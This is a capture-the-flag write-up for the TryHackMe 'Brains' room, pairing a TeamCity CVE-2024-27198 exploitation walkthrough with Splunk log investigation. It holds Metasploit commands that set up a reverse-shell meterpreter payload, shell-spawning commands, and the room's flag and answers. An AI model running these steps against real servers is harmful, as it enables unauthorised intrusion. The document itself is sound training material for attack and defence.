````md
# TryHackMe - Brains Writeup 🧠🔍

![Category](https://img.shields.io/badge/Category-web)
![Difficulty](https://img.shields.io/badge/Difficulty-easy)
![Tools](https://img.shields.io/badge/Tools-Metasploit%20%7C%20splunk%20%7C%20python3-lightgrey)

---

## 📖 Scenario Overview

The **Brains** room on TryHackMe simulates a real-world compromise involving a vulnerable CI/CD infrastructure.  
The target server is running **JetBrains TeamCity**, which contains a critical authentication bypass vulnerability that can lead to Remote Code Execution (RCE).

After gaining access to the machine, the challenge shifts into a **Blue Team investigation**, where Splunk is used to trace attacker activity, persistence mechanisms, and malicious artifacts left behind.

---

## 🎯 Objectives

### 🔴 Red Team
- Enumerate the target machine
- Identify vulnerable services
- Exploit TeamCity RCE vulnerability
- Gain shell access and capture the flag

### 🔵 Blue Team
- Investigate attacker persistence
- Identify malicious package installations
- Analyze TeamCity activity logs
- Discover uploaded malicious plugins

---

## 🛠️ Tools Used

* **Nmap** — Service enumeration and port scanning  
* **Metasploit Framework** — Exploiting CVE-2024-27198  
* **Linux CLI** — Post-exploitation enumeration  
* **Splunk** — Log analysis and threat hunting  

---

## 📂 Repository Contents

* `challenge` - TryHackMe - https://tryhackme.com/room/brains  
* `writeup.md` - Full technical walkthrough  
* `README.md` - Project overview  

---

# 🚀 Solution Summary

## 🔴 Phase 1 — Reconnaissance

Performed a full Nmap scan:

```bash
nmap -sC -sV -p- -v <TARGET_IP>
````

### Discovered Services

| Port  | Service | Version  |
| ----- | ------- | -------- |
| 22    | SSH     | OpenSSH  |
| 80    | HTTP    | Apache   |
| 50000 | HTTP    | TeamCity |

Port `50000` exposed a **JetBrains TeamCity** instance.

---

## 🔴 Phase 2 — Vulnerability Identification

The TeamCity login portal revealed:

```text
TeamCity 2023.11.3
```

Research identified the target as vulnerable to:

## CVE-2024-27198

* Authentication Bypass
* Remote Code Execution
* Unauthenticated access to TeamCity REST API

---

## 🔴 Phase 3 — Exploitation

Used Metasploit to exploit the vulnerability:

```bash
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
```

### Payload Configuration

```bash
set RHOSTS <TARGET_IP>
set RPORT 50000
set payload java/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
exploit
```

### Result

* Authentication bypass successful
* Malicious plugin uploaded
* Meterpreter session established

---

## 🔴 Phase 4 — Post Exploitation

Spawned an interactive shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Retrieved the flag:

```bash
cat flag.txt
```

### 🚩 Flag

```text
THM{faa9bac345709b6620a6200b484c7594}
```

---

# 🔵 Blue Team Investigation

After compromise, Splunk was used to investigate attacker actions.

---

## Investigation 1 — Backdoor User Creation

### Splunk Query

```spl
index=* sourcetype=auth_logs "new user"
```

### Findings

Identified a suspicious user created by the attacker.

### Answer

```text
eviluser
```

---

## Investigation 2 — Malicious Package Installation

### Splunk Query

```spl
index=* ("apt install" OR "dpkg -i")
```

### Findings

Detected suspicious package installations including:

* gcc
* apache2
* java-common
* net-tools

A malicious Debian package was also discovered:

```text
datacollector
```

### Answer

```text
datacollector
```

---

## Investigation 3 — Malicious Plugin Upload

### Splunk Query

```spl
index=* sourcetype=teamcity_activities "plugin"
```

### Findings

TeamCity logs revealed the uploaded malicious plugin archive.

### Answer

```text
AyzzbuXY.zip
```

---

# 📚 Key Takeaways

## 🔴 Red Team

* Importance of service enumeration
* Exploiting vulnerable CI/CD platforms
* Understanding TeamCity RCE attacks
* Proper payload selection for Java applications

## 🔵 Blue Team

* Detecting persistence through auth logs
* Monitoring package installations
* Hunting malicious TeamCity activity
* Using Splunk for forensic investigations

---

# ⚠️ Security Lessons

This room demonstrates how dangerous unpatched CI/CD environments can be.

The vulnerability **CVE-2024-27198** allows attackers to:

* Bypass authentication
* Upload malicious plugins
* Execute arbitrary code
* Fully compromise the server

Proper patch management, logging, and monitoring are essential for defending CI/CD infrastructure.

---

# 👨‍💻 Author

**Khairul Azim**

* GitHub: [https://github.com/AzimSource](https://github.com/AzimSource)
* Portfolio: [https://azimsource.github.io/azim-portfolio/](https://azimsource.github.io/azim-portfolio/)

---

```
```
